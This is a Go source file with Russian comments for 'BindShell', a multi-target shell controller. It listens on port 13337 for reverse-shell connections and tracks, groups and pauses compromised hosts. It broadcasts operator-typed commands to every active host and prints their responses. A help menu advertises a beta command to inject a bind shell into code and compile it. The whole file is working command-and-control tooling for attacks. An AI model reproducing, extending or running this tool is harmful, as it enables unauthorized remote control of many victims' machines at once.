package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var global_response_timeout int = 1000
var global_buffer_size int = 4096
var active_targets int = 0

// Предоставляет список встроенных команд (вызов: /BS help).
func BindShellHelp() {
	fmt.Println("[BindShell] Command list:")
	fmt.Println("\n\t\tTargets status:")
	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip:port> to set;")
	fmt.Println("\t- /BS add list <file> \t\tAdd targets from <file> to set;")
	fmt.Println("\t- /BS group <group> <host_id> \tAdd target <host_id> to <group>;")
	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
	fmt.Println("\t- /BS off \t\t\tStop sending commands to the all hosts;")
	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
	fmt.Println("\t- /BS off group <group> \tStop sending commands to the <group>;")
	fmt.Println("\t- /BS on \t\t\tResume sending commands to the all hosts;")
	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host;")
	fmt.Println("\t- /BS on group <group> \t\tResume sending commands to the <group>.")

	fmt.Println("\n\t\tShell injecting:")
	fmt.Println("\t- /BS inject <file_path> <shell_type> <OS> <Arch> <ip> <port> \t\tInject bind shell to code and compile it. (BETA)")

	fmt.Println("\n\t\tConfiguration:")
	fmt.Println("\t- /BS config \t\t\tGet current configuration;")
	fmt.Println("\t- /BS timeout <time> \t\tSet targets response timeout to <time> millisecond(s);")
	fmt.Println("\t- /BS buffer <size> \t\tSet buffer size to <size> byte(s).")

	fmt.Println("\n\t\tOther:")
	fmt.Println("\t- /BS help \t\t\tShow this list;")
	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>; (TODO)")
	fmt.Println("\t- /BS stop \t\t\tFinish session.")

	fmt.Println("")
}

// Завершает работу программы (вызов: /BS stop)
func BindShellStop(targets *[]Target) {
	// Завершение всех активных соединений
	finishAllSessions(targets)

	// Завершение программы
	fmt.Println("[BindShell] Shutdown...")
	os.Exit(0)
}

// Выводит список целевых хостов (вызов: /BS targets)
func BindShellTargets(targets *[]Target) {
	fmt.Printf("[BindShell] Current targets (active: %d, total: %d):\n", active_targets, len(*targets))
	for i := 0; i < len(*targets); i++ {
		if (*targets)[i].status == true {
			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
		} else {
			fmt.Printf("\t<%d> [-] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
		}
	}
}

// Удаляет выбранный хост из списка целей и завершает с ним сессию (вызов: /BS remove)
func BindShellRemove(targets *[]Target, idx int) {
	active_targets--

	// Завершение сессии удаляемого хоста
	finishSession((*targets)[idx])

	fmt.Printf("[BindShell] %s << Host removed from target list.\n", (*targets)[idx].name)

	// Удаление хоста из списка целей
	*targets = append((*targets)[:idx], (*targets)[idx+1:]...)
}

// Приостановление взаимодействия с целью (вызов: /BS off)
func BindShellOff(targets *[]Target, idx int) {
	if (*targets)[idx].status == false {
		fmt.Println("[BindShell] The host is already an inactive target!")
		return
	}

	active_targets--
	(*targets)[idx].status = false
	fmt.Printf("[BindShell] %s off.\n", (*targets)[idx].name)
}

// Возобновление взаимодействия с целью (вызов: /BS on)
func BindShellOn(targets *[]Target, idx int) {
	if (*targets)[idx].status == true {
		fmt.Println("[BindShell] The host is already an active target!")
		return
	}

	active_targets++
	(*targets)[idx].status = true
	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
}

// Вывод сведений о текущей конфигурации
func BindShellConfig() {
	fmt.Println("[BindShell] Current configuration:")
	fmt.Printf("\tResponse timeout: %d millisecond(s).\n", global_response_timeout)
	fmt.Printf("\tBuffer size: %d byte(s).\n", global_buffer_size)
}

// Устанавливает значение переменной global_response_timeout равным value (вызов: /BS timeout)
func BindShellTimeout(value int) {
	global_response_timeout = value
	fmt.Printf("[BindShell] Response timeout set to %d millisecond(s).\n", global_response_timeout)
}

// Устанавливает значение переменной global_buffer_size равным value (вызов: /BS buffer)
func BindShellBufferSize(value int) {
	global_buffer_size = value
	fmt.Printf("[BindShell] Buffer size set to %d byte(s).\n", global_buffer_size)
}

// Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
func BindShellAdd(targets *[]Target, target_name string) {
	addSession(targets, target_name)
}

func BindShellListAdd(targets *[]Target, targets_file string) {
	// Открытие файла с новыми целями
	file, err := os.Open(targets_file)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	// Создание сканера для считывания
	scanner := bufio.NewScanner(file)

	// Построчное считывание файла
	for scanner.Scan() {
		// Получение имени хоста
		target_name := scanner.Text()
		isUnique := true

		// Проверка уникальности новой цели
		for i := 0; i < len(*targets); i++ {
			// Если цель уже присутствует в списке:
			if target_name == (*targets)[i].name {
				// Указать на это
				isUnique = false
				break
			}
		}

		// Если цель уникальна - добавление сессии
		if isUnique {
			addSession(targets, target_name)
		}
	}
}

func BindShellGroup(targets *[]Target, idx int, group_name string) {
	(*targets)[idx].group = group_name
	fmt.Printf("[BindShell] %s group set: %s\n", (*targets)[idx].name, group_name)
}

func BindShellRequest(request []string, targets *[]Target) {
	// В случае, если конкретная инструкция не указана, вызывается /BS help
	if len(request) == 1 {
		BindShellHelp()
		return
	}

	switch request[1] {
	case "add":
		if len(request) < 3 {
			return
		}

		if request[2] == "list" {
			BindShellListAdd(targets, request[3])
		} else {
			BindShellAdd(targets, request[2])
		}
	case "buffer":
		ok, value := checkPositiveNumber(request[2])
		if ok {
			BindShellBufferSize(value)
		}
	case "config":
		BindShellConfig()
	case "help":
		BindShellHelp()
	case "inject":
		ok, value := checkPositiveNumber(request[7])
		if ok {
			BindShellInject(request[2], request[3], request[4], request[5], request[6], value)
		}
	case "group":
		ok, idx := checkTargetNumber(targets, request[3])

		if ok {
			BindShellGroup(targets, idx, request[2])
		}
	case "off":
		// Если аргументов более трех, остановка
		if len(request) > 4 {
			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"")
			return
		}

		// Если не указан конкретный хост, приостановить всё
		if len(request) == 2 {
			for i := 0; i < len(*targets); i++ {
				BindShellOff(targets, i)
			}
			return
		}

		// Если указана конкретная группа хостов, присотановить всю группу
		if len(request) == 4 && request[2] == "group" {
			for i := 0; i < len(*targets); i++ {
				if (*targets)[i].group == request[3] {
					BindShellOff(targets, i)
				}
			}
			return
		}

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, приостановить действия на выбранном хосте
		if ok {
			BindShellOff(targets, idx)
		}
	case "on":
		// Если аргументов более трех, остановка
		if len(request) > 4 {
			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"")
			return
		}

		// Если не указан конкретный хост, возобновить всё
		if len(request) == 2 {
			for i := 0; i < len(*targets); i++ {
				BindShellOn(targets, i)
			}
			return
		}

		// Если указана конкретная группа хостов, возобновить всю группу
		if len(request) == 4 && request[2] == "group" {
			for i := 0; i < len(*targets); i++ {
				if (*targets)[i].group == request[3] {
					BindShellOn(targets, i)
				}
			}
			return
		}

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, возобновить действия на выбранном хосте
		if ok {
			BindShellOn(targets, idx)
		}
	case "remove":
		// Если аргументов более трех, остановка
		if len(request) > 3 {
			fmt.Println("[BindShell] Error! Correct usage: \"/BS remove\" or \"/BS remove <host_id>\"")
			return
		}

		// Если не указан конкретный хост, удалить всё
		if len(request) == 2 {
			cnt := len(*targets)
			for i := 0; i < cnt; i++ {
				BindShellRemove(targets, 0)
			}
			return
		}

		/*
			// Если указана конкретная группа хостов, удалить всю группу
			if len(request) == 4 && request[2] == "group" {
				cnt := len(*targets)
				for i := 0; i < cnt; {
					if (*targets)[i].group == request[3] {
						BindShellOff(targets, i)
					} else {
						i++
					}
				}
				return
			}
		*/

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, удаляет выбранный хост
		if ok {
			BindShellRemove(targets, idx)
		}
	case "stop":
		BindShellStop(targets)
	case "targets":
		BindShellTargets(targets)
	case "timeout":
		ok, value := checkPositiveNumber(request[2])
		if ok {
			BindShellTimeout(value)
		}
	default:
		fmt.Println("[BindShell] Incorrect shell command!")
	}
}

func ReverseShellHandle(targets *[]Target, conn net.Conn) {
	// Создание буфера для считывания ОС целевого хоста
	init_buf := make([]byte, global_buffer_size)

	// Чтение ОС хоста
	n, err := conn.Read(init_buf)
	if err != nil {
		return
	}

	// Добавление хоста в список целей
	*targets = append(*targets, Target{name: conn.RemoteAddr().String(), conn: conn, status: false, group: string(init_buf[:n])})
}

func ReverseShellStartServer(targets *[]Target) {
	listener, err := net.Listen("tcp", ":13337")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go ReverseShellHandle(targets, conn)
	}
}

func main() {
	// Инициализация контейнера целей
	targets := make([]Target, 0, 1)

	// Запуск сервера для подключения через Reverse shell
	go ReverseShellStartServer(&targets)

	// Создание объекта NewReader стандартного потока ввода
	reader := bufio.NewReader(os.Stdin)

	// Инструктаж пользователя
	fmt.Printf("[BindShell] Print \"/BS help\" to get info.\n")
	for {
		// Приглашение к вводу команды
		fmt.Print("[BindShell] >> ")

		// Считывание команды пользователя
		input, _ := reader.ReadString('\n')

		// Обработка пустого ввода
		if len(input) <= 2 {
			continue
		}

		// Удаление лишних символов
		input = strings.TrimSpace(input)

		// Разбиение команды на аргументы
		splitted_input := strings.Fields(input)

		// Проверка типа команды
		if splitted_input[0] == "/BS" {
			// Выполнение встроенной команды BindShell
			BindShellRequest(splitted_input, &targets)
		} else {
			// Создание канала для получения результатов команд
			ch_resp := make(chan string)

			// Выполнение команды для каждого активного хоста
			for i := 0; i < len(targets); i++ {
				if targets[i].status == true {
					// Отправка команды на целевой хост
					go sendCommand(targets[i], input, ch_resp)
				}
			}

			// Получение ответов от каждого активного хоста
			for i := 0; i < active_targets; i++ {
				response := <-ch_resp
				if len(response) > 0 {
					fmt.Println(response)
				}
			}
		}
	}
}
